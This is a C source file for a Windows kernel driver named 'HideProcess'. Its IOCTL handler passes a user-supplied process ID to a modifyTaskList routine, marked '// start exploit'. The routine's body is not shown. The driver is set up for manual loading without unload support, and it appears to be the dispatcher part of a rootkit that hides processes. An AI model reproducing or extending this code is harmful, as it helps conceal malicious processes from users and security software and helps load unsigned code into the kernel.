#include <ntddk.h>
#include "main.h"
#include "driver.h"

#define DEBUGPRINT

NTSTATUS DevioctlDispatch(
	_In_ struct _DEVICE_OBJECT *DeviceObject,
	_Inout_ struct _IRP *Irp
)
{
	NTSTATUS				status = STATUS_SUCCESS;
	ULONG					bytesIO = 0;
	PIO_STACK_LOCATION		stack;
	BOOLEAN					condition = FALSE;
	PINOUTPARAM             rp, wp;

	UNREFERENCED_PARAMETER(DeviceObject);

	stack = IoGetCurrentIrpStackLocation(Irp);

	do {

		if (stack == NULL) {
			status = STATUS_INTERNAL_ERROR;
			break;
		}

		rp = (PINOUTPARAM)Irp->AssociatedIrp.SystemBuffer;
		wp = (PINOUTPARAM)Irp->AssociatedIrp.SystemBuffer;
		if (rp == NULL) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (stack->Parameters.DeviceIoControl.IoControlCode) {
		case DUMMYDRV_REQUEST1:
			if (stack->Parameters.DeviceIoControl.InputBufferLength != sizeof(INOUT_PARAM)) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			// start exploit
			modifyTaskList(rp->pid);

			//DbgPrint("%s in params = %lx, %lx, %lx, %lx", __FUNCTION__, rp->Param1, rp->Param2, rp->Param3, rp->Param4);

			//wp->Param1 = 11111111;
			//wp->Param2 = 22222222;
			//wp->Param3 = 33333333;
			//wp->Param4 = 44444444;

			status = STATUS_SUCCESS;
			bytesIO = sizeof(INOUT_PARAM);

			break;

		default:
			status = STATUS_INVALID_PARAMETER;
		};

	} while (condition);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = bytesIO;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS UnsupportedDispatch(
	_In_ struct _DEVICE_OBJECT *DeviceObject,
	_Inout_ struct _IRP *Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

NTSTATUS CreateDispatch(
	_In_ struct _DEVICE_OBJECT *DeviceObject,
	_Inout_ struct _IRP *Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

NTSTATUS CloseDispatch(
	_In_ struct _DEVICE_OBJECT *DeviceObject,
	_Inout_ struct _IRP *Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

NTSTATUS DriverInitialize(
	_In_  struct _DRIVER_OBJECT *DriverObject,
	_In_  PUNICODE_STRING RegistryPath
)
{
	NTSTATUS        status;
	UNICODE_STRING  SymLink, DevName;
	PDEVICE_OBJECT  devobj;
	ULONG           t;

	//RegistryPath is NULL
	UNREFERENCED_PARAMETER(RegistryPath);

	RtlInitUnicodeString(&DevName, L"\\Device\\HideProcess");
	status = IoCreateDevice(DriverObject, 0, &DevName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, TRUE, &devobj);

	if (!NT_SUCCESS(status)) {
		return status;
	}

	RtlInitUnicodeString(&SymLink, L"\\DosDevices\\HideProcess");
	status = IoCreateSymbolicLink(&SymLink, &DevName);

	devobj->Flags |= DO_BUFFERED_IO;

	for (t = 0; t <= IRP_MJ_MAXIMUM_FUNCTION; t++)
		DriverObject->MajorFunction[t] = &UnsupportedDispatch;

	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = &DevioctlDispatch;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = &CreateDispatch;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = &CloseDispatch;
	DriverObject->DriverUnload = NULL; //nonstandard way of driver loading, no unload

	devobj->Flags &= ~DO_DEVICE_INITIALIZING;
	return status;
}

NTSTATUS DriverEntry(
	_In_  struct _DRIVER_OBJECT *DriverObject,
	_In_  PUNICODE_STRING RegistryPath
)
{
	NTSTATUS        status;
	UNICODE_STRING  drvName;

	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	RtlInitUnicodeString(&drvName, L"\\Driver\\HideProcess");
	status = IoCreateDriver(&drvName, &DriverInitialize);

	return status;
}